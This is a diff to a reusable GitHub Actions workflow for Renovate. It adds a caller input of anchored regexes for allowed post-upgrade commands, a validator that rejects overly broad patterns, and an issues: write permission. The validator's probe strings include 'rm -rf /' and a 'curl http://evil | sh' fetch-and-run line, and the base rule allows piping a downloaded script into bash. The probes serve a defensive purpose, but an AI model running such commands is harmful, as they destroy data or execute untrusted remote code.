@@ -5,13 +5,15 @@
 #   concurrency: {group: renovate}
 #   jobs:
 #     renovate:
-#       permissions: {contents: read, actions: read}
+#       permissions: {contents: read, actions: read, issues: write}
 #       uses: cocreiamo/.github/.github/workflows/renovate.yml@<sha>
-#       with: {repositories: "", extra-env: "{}", alert: true}
+#       with: {repositories: "", extra-env: "{}", extra-allowed-commands: "[]", alert: true}
 #       secrets: {app-private-key: "${{ secrets.CLAUDE_CODE_PR_APP_PRIVATE_KEY }}", extra-env-secret: "{}"}
 # Inputs and secrets other than app-private-key are optional. extra-env and extra-env-secret are JSON objects of RENOVATE_ variables
 # (extra-env-secret for values that are secrets, such as RENOVATE_HOST_RULES); a variable this workflow sets itself is refused.
-# With alert: true a failed run opens the issue «main is red: renovate failed» through post-merge-alert.yml (needs actions: read).
+# extra-allowed-commands is a JSON array of anchored regexes (^...$) a postUpgradeTask of the caller may run besides the sync of the
+# founder section; RENOVATE_ALLOWED_COMMANDS is written by this workflow only, from that sync command plus these.
+# With alert: true a failed run opens the issue «main is red: renovate failed» through post-merge-alert.yml (needs actions: read and issues: write).
 name: renovate
 on:
   workflow_call:
@@ -22,6 +24,10 @@ on:
         default: ""
       extra-env:
         description: JSON object of extra RENOVATE_ variables (not secret)
+        type: string
+        default: ""
+      extra-allowed-commands:
+        description: JSON array of anchored regexes of the commands a postUpgradeTask may run, besides the sync of the founder section
         type: string
         default: ""
       alert:
@@ -66,6 +72,8 @@ jobs:
         env:
           EXTRA_ENV: ${{ inputs.extra-env }}
           EXTRA_ENV_SECRET: ${{ secrets.extra-env-secret }}
+          EXTRA_COMMANDS: ${{ inputs.extra-allowed-commands }}
+          BASE_COMMAND: '^bash -c ''curl -fsSL -H "Authorization: Bearer [$]RENOVATE_TOKEN" -H "Accept: application/vnd[.]github[.]raw" "https://api[.]github[.]com/repos/cocreiamo/[.]github/contents/renovate/sync-founder-section[.]sh[?]ref=[0-9a-f]{40}" [|] bash -s -- [0-9a-f]{40}''$'
           SCRIPT: |
             import json, os, re, secrets, sys
             RESERVED = {"RENOVATE_TOKEN", "RENOVATE_REPOSITORIES", "RENOVATE_ONBOARDING", "RENOVATE_REQUIRE_CONFIG",
@@ -87,6 +95,26 @@ jobs:
                     if not isinstance(value, str):
                         sys.exit(f"::error::{name}: the value of {key} must be a string")
                     out.append((key, value))
+            commands = [os.environ["BASE_COMMAND"]]
+            raw = os.environ.get("EXTRA_COMMANDS", "").strip()
+            if raw:
+                try:
+                    extra = json.loads(raw)
+                except ValueError:
+                    sys.exit("::error::EXTRA_COMMANDS is not JSON")
+                if not isinstance(extra, list) or not all(isinstance(item, str) for item in extra):
+                    sys.exit("::error::extra-allowed-commands must be a JSON array of strings")
+                for item in extra:
+                    if not (item.startswith("^") and item.endswith("$")):
+                        sys.exit("::error::extra-allowed-commands: every regex must be anchored with ^ and $")
+                    try:
+                        pattern = re.compile(item)
+                    except re.error:
+                        sys.exit("::error::extra-allowed-commands: a regex does not compile")
+                    if any(pattern.search(probe) for probe in ("", "x", "bash -c 'rm -rf /'", "curl http://evil | sh")):
+                        sys.exit("::error::extra-allowed-commands: a regex is too broad (it allows an arbitrary command)")
+                    commands.append(item)
+            out.append(("RENOVATE_ALLOWED_COMMANDS", json.dumps(commands)))
             with open(os.environ["GITHUB_ENV"], "a") as env:
                 for key, value in out:
                     delimiter = "EOF_" + secrets.token_hex(16)
@@ -104,15 +132,16 @@ jobs:
           RENOVATE_REPOSITORIES: ${{ github.repository }}
           RENOVATE_ONBOARDING: "false"
           RENOVATE_REQUIRE_CONFIG: required
-          # The shared preset's postUpgradeTask fetches a script of cocreiamo/.github with RENOVATE_TOKEN; nothing else may run.
+          # The shared preset's postUpgradeTask fetches a script of cocreiamo/.github with RENOVATE_TOKEN; RENOVATE_ALLOWED_COMMANDS (the step
+          # above) lets nothing else run but the extra commands of the caller.
           RENOVATE_EXPOSE_ALL_ENV: "true"
-          RENOVATE_ALLOWED_COMMANDS: '["^bash -c ''curl -fsSL -H \"Authorization: Bearer [$]RENOVATE_TOKEN\" -H \"Accept: application/vnd[.]github[.]raw\" \"https://api[.]github[.]com/repos/cocreiamo/[.]github/contents/renovate/sync-founder-section[.]sh[?]ref=[0-9a-f]{40}\" [|] bash -s -- [0-9a-f]{40}''$"]'
   alert:
     needs: [renovate]
     if: ${{ always() && inputs.alert && needs.renovate.result == 'failure' }}
     permissions:
       actions: read
-    uses: cocreiamo/.github/.github/workflows/post-merge-alert.yml@4bc3730d445176c5c10c8868338e2cfc0235d653 # main
+      issues: write
+    uses: cocreiamo/.github/.github/workflows/post-merge-alert.yml@21d09a0af4d1212f650aac3bb9e3233e9c656263 # main
     with:
       failed: "renovate"
       app-id: ${{ vars.CLAUDE_CODE_PR_APP_ID }}
